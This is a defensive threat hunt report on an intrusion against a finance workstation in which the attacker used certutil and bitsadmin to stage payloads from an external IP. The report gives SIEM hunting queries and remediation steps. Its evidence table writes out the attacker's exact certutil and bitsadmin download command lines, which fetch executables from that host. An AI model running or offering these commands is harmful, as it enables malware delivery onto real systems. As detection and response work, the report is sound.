# Threat Hunt Report: TH-001

**Hunt Title:** Living-Off-The-Land Binary Egress File Transfer (`certutil.exe` & `bitsadmin.exe`)  
**Project Code:** `PROJ-CYBE-260802` (internal baseline: `CDL-DET-V2`)  
**Hunt ID:** `TH-001`  
**Target MITRE ATT&CK Techniques:** `T1105` (Ingress Tool Transfer), `T1197` (BITS Jobs), `T1027` (Obfuscated Files or Information)  
**Assigned Hunter:** Abhijeet Amarnath Sharma - Senior Threat Hunter  
**Hunt Window:** 2026-08-14T00:00:00Z to 2026-08-14T23:59:59Z  
**Status:** Completed - Confirmed True-Positive Finding  

---

## 1. Executive Summary

During scheduled proactive threat hunting engagement `TH-001`, the Cyberion ThreatShield threat hunting team analyzed endpoint process execution telemetry to identify dual-use Living-off-the-Land Binaries and Scripts (LOLBAS) utilized for unalerted ingress tool transfer.

While the SOC maintains automated Sigma detections for script interpreters and encoded execution (`T1059.001`), legitimate administrative utilities such as `certutil.exe` and `bitsadmin.exe` were intentionally monitored via threat hunting rather than broad static alerts to reduce alert fatigue.

This hunt confirmed an active, unalerted true-positive adversary intrusion on host **`WS-FIN-04.cyberion.local`** (`10.20.1.15`). The compromised user account **`CYBERION\j.doe`** was observed executing `certutil.exe` and `bitsadmin.exe` to stage secondary executable payloads from external adversary infrastructure (`185.220.101.45`) into temporary staging folders (`AppData\Local\Temp` and `C:\Windows\Temp`).

---

## 2. Hunt Hypothesis & Methodology

### 2.1 Threat Hypothesis
Adversaries who establish initial command execution will utilize trusted, pre-installed Windows operating system binaries (`certutil.exe` and `bitsadmin.exe`) to download secondary tooling and malicious payloads from remote Command-and-Control infrastructure, effectively bypassing proxy categorization filters, reputation blocklists, and legacy endpoint signature detection.

### 2.2 Data Sources & Telemetry Scope
* **Windows Security Event Log (`Channel: Security`):** EventID 4688 (Process Creation with Full Command Line Process Auditing).
* **Microsoft Sysmon (`Channel: Microsoft-Windows-Sysmon/Operational`):** EventID 1 (Process Creation with SHA256 hashes, Parent Process Guid, and Process Guid).
* **Zeek Network Telemetry (`conn.log` & `http.log`):** Correlation with outbound HTTP/HTTPS sessions originating from endpoint IP addresses.

### 2.3 Hunting Analytics & Query Logic

#### Query 1: Detection of `certutil` Remote Retrieval Flags
```sql
-- SIEM / Splunk / Athena Syntax
SELECT 
    TimeCreated, Computer, SubjectUserName, Image, CommandLine, ParentImage
FROM windows_security_sysmon
WHERE (EventID IN (1, 4688))
  AND (Image LIKE '%\certutil.exe' OR NewProcessName LIKE '%\certutil.exe')
  AND (
      CommandLine LIKE '%-urlcache%' 
      OR CommandLine LIKE '%/urlcache%' 
      OR CommandLine LIKE '%-split%' 
      OR CommandLine LIKE '%/split%'
      OR CommandLine LIKE '%http://%' 
      OR CommandLine LIKE '%https://%'
  )
ORDER BY TimeCreated ASC;
```

#### Query 2: Detection of `bitsadmin` Remote Transfer Jobs
```sql
SELECT 
    TimeCreated, Computer, SubjectUserName, Image, CommandLine, ParentProcessName
FROM windows_security_sysmon
WHERE (EventID IN (1, 4688))
  AND (Image LIKE '%\bitsadmin.exe' OR NewProcessName LIKE '%\bitsadmin.exe')
  AND (
      CommandLine LIKE '%/transfer%' 
      OR CommandLine LIKE '%/download%' 
      OR CommandLine LIKE '%/addfile%'
  )
ORDER BY TimeCreated ASC;
```

---

## 3. Findings & Evidence Reconstruction

### 3.1 Chronological Evidence Table

| Timestamp (UTC) | Hostname | EventID | Process | Parent Process | Executed Command Line | Staged File Path |
| :--- | :--- | :---: | :--- | :--- | :--- | :--- |
| **2026-08-14 08:07:00.000Z** | `WS-FIN-04.cyberion.local` | `4688` | `certutil.exe` | `cmd.exe` (`PID: 7200`) | `certutil.exe -urlcache -split -f http://185.220.101.45/payload.exe C:\Users\j.doe\AppData\Local\Temp\svchost32.exe` | `C:\Users\j.doe\AppData\Local\Temp\svchost32.exe` |
| **2026-08-14 08:07:30.000Z** | `WS-FIN-04.cyberion.local` | `4688` | `bitsadmin.exe` | `cmd.exe` (`PID: 7200`) | `bitsadmin /transfer svcupdate /download /priority high http://185.220.101.45/update.dll C:\Windows\Temp\update.dll` | `C:\Windows\Temp\update.dll` |

### 3.2 Contextual Process Chain Analysis
1. **Upstream Activity:** Prior to the downloads, user `CYBERION\j.doe` logged in via interactive RDP at `2026-08-14 08:05:12 UTC` following brute-force attempts from `185.220.101.45`.
2. **Execution Vector:** At `08:06:00 UTC`, an obfuscated Base64 PowerShell session was initiated (`EventID: 1`), spawning a command shell `cmd.exe` (`PID: 7200`).
3. **Payload Retrieval:** Within 90 seconds of initial discovery (`whoami /priv` at `08:06:30 UTC`), the operator executed:
   * `certutil.exe` with `-urlcache -split -f` to force download and discard cache artifacts, retrieving `payload.exe` disguised as `svchost32.exe`.
   * `bitsadmin.exe` creating a high-priority background job `svcupdate` to transfer `update.dll` directly into `C:\Windows\Temp\`.
4. **Downstream Activity:** At `08:08:00 UTC`, `schtasks.exe` was invoked to register `update.dll` as a persistent SYSTEM scheduled task.

---

## 4. Threat Hunter Risk Assessment

* **Detection Evasion Rating:** **High**. Neither command triggered basic antivirus signatures on disk because `certutil.exe` and `bitsadmin.exe` are Microsoft-signed binaries in `C:\Windows\System32\`.
* **Impact Rating:** **Critical**. Staging files into `C:\Windows\Temp\` and `AppData\Local\Temp\` provided the adversary with binary persistence components required for subsequent LSASS dumping (`T1003.001`) and lateral movement (`T1021.002`).
* **Hunt Finding Verdict:** **Confirmed Compromise (True-Positive Finding)**.

---

## 5. Strategic Recommendations & Defensive Improvements

### 5.1 Immediate Action Items
1. **Isolate Endpoint:** Disconnect `WS-FIN-04` from the corporate network immediately via EDR network containment.
2. **Forensic Acquisition:** Collect forensic disk images and MFT journal entries for `C:\Windows\Temp\update.dll` and `C:\Users\j.doe\AppData\Local\Temp\svchost32.exe`.
3. **IOC Blocking:** Block destination IP `185.220.101.45` and URLs `http://185.220.101.45/*` at edge firewalls and web proxies.

### 5.2 Engineering Detections (New Sigma Detection Conversion)
Author two production Sigma detection rules to transition this hunt finding into permanent 24/7 alerting:
* `sigma_win_certutil_download_cradle.yml`: Alerting on `certutil` with command parameters matching `urlcache` and URL schemes.
* `sigma_win_bitsadmin_download_activity.yml`: Alerting on `bitsadmin` transfers with external HTTP/S source URLs.

### 5.3 System Hardening & Application Control
* Implement **AppLocker** or **Windows Defender Application Control (WDAC)** policies in block mode to restrict non-administrative execution of `certutil.exe` with network access parameters.
* Restrict proxy egress access so endpoints cannot download raw binary executables directly over non-standard unencrypted HTTP channels.
